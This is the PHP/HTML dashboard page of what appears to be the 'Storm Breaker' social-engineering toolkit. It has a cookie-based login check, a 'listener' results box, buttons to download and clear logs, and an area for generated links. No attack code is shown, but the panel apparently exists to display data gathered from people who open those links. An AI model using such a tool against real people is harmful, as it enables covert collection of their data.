<?php
session_start();
include "./assets/components/login-arc.php";


if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }

}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);

}


else {
    header('location: login.php');
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <title>Storm Breaker - V3</title>
    <div class="title">
        <h1>GAMKERS SET TOOL KIT</h1>
      </div>
    <style>
        /* Body and General Page Styles */
        body {
            background-color: #000; /* Black background */
            color: #fff; /* White text for contrast */
            font-family: Arial, sans-serif;
        }

        .title h1 {
        font-size: 50px;
        margin-bottom: 100px;
        margin-top: 100px;
        padding-left: 30px;
        padding-right: 10px;
        color: #F0F0F0;
        text-align: center;
        }

        /* Textarea styling */
        textarea.form-control {
            background-color: #121212; /* Darker black background for the textarea */
            color: #0f0; /* Green text */
            border: 1px solid #28a745; /* Green border to match the theme */
        }

        /* Buttons Styling */
        .btn {
            color: #000;               /* Text color */
            background-color: #fff;     /* White background */
            border-radius: 10px;        /* Curved edges */
            padding: 10px 20px;         /* Increase padding for larger size */
            font-size: 16px;            /* Adjust font size */
            border: 1px solid #ccc;     /* Optional border */
            transition: background-color 0.3s ease, transform 0.2s; /* Smooth transition */
        }

        /* Button Redesign */
        .btn-danger {
            background-color: #dc3545; /* Red background */
            border-color: #dc3545;
        }

        .btn-danger:hover {
            background-color: #c82333; /* Darker red for hover */
        }

        .btn-success {
            background-color: #28a745; /* Green background */
            border-color: #28a745;
        }

        .btn-success:hover {
            background-color: #218838; /* Darker green on hover */
        }

        .btn-warning {
            background-color: #ffc107; /* Yellow button for "Clear Logs" */
            border-color: #ffc107;
            color: #000; /* Black text for contrast */
        }

        .btn-warning:hover {
            background-color: #e0a800; /* Darker yellow on hover */
        }

        /* Centering Content */
        .d-flex {
            justify-content: center;
        }

        /* Style for the Links Section */
        #links {
            margin-top: 20px;
        }
        #path {
             display: none;
        }


        /* Ensures proper sizing and spacing */
        .mt-2 {
            margin-top: 1rem !important;
        }

        .w-50 {
            width: 50% !important;
        }

        /* Button Spacing */
        .m-2 {
            margin: 0.5rem !important;


        }

        @media (max-width: 768px) {
            .mt-2 {
            margin-top: 1rem !important;
        }
        .title h1 {
        font-size: 50px;
        margin-bottom: 100px;
        margin-top: 100px;
        padding-left: 40px;
        color: #F0F0F0;
        text-align: center;
        }
    }
    </style>
</head>

<body id="ourbody" onload="check_new_version()">

<div id="links"></div>


<div class="mt-2 d-flex justify-content-center">
    <textarea class="form-control w-50 m-3" placeholder="result ..." id="result" rows="15" ></textarea>
</div>

<div class="mt-2 d-flex justify-content-center">
    <button class="btn btn-danger m-2" id="btn-listen">Listener Runing / press to stop</button>
    <button class="btn btn-success m-2" id="btn-listen" onclick=saveTextAsFile(result.value,'log.txt')>Download Logs</button>
    <button class="btn btn-warning m-2" id="btn-clear">Clear Logs</button>
</div>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>

</body>
</html>
